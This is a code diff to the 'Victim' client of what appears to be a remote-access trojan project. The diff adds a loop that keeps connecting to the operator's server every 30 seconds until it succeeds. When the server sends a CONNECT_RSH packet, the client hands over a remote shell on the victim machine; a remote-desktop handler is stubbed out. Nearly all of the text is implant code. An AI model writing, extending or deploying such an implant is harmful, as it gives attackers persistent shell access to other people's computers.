@@ -1,3 +1,4 @@
+import time
 from socket import socket, AF_INET, SOCK_STREAM
 
 from src.modlues.protocols.general import GeneralPacketType
@@ -8,30 +9,36 @@ from src.modlues.remote_shell.victim_rsh import RemoteShellVictimSide
 class Victim:
 
     def __init__(self, server_ip, server_port):
-        self.SERVER_IP = server_ip
-        self.SERVER_PORT = server_port
-        self.ADDR = (self.SERVER_IP, self.SERVER_PORT)
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.server_addr = (self.server_ip, self.server_port)
         self.victim = socket(AF_INET, SOCK_STREAM)
-        self.connected = True
+        self.is_connected = False
 
     def main(self):
         self.__connect()
-        while self.connected:
+        while self.is_connected:
             packet = HandelPacket.recv_packet(self.victim)
             self.handle(packet)
 
     def handle(self, packet: Packet):
-        if packet.packet_type == PacketType.GENERAL.value and packet.packet_sub_type == GeneralPacketType.CONNECT_RSH.value:
-            RemoteShellVictimSide(self.victim).main()
+
+        print(packet, "victim main")
+        if packet.packet_type == PacketType.GENERAL.value:
+            if packet.packet_sub_type == GeneralPacketType.CONNECT_RSH.value:
+                self.__start_remote_shell()
 
     def __connect(self):
-        self.victim.connect(self.ADDR)
-
-    def __on_connect(self, conn, addr):
-        pass
+        while not self.is_connected:
+            try:
+                self.victim.connect(self.server_addr)
+                self.is_connected = True
+                print(f"Connected to: {self.server_addr}")
+            except Exception as e:
+                time.sleep(30)
 
     def __start_remote_desktop(self):
         pass
 
     def __start_remote_shell(self):
-        pass
+        RemoteShellVictimSide(self.victim).main()
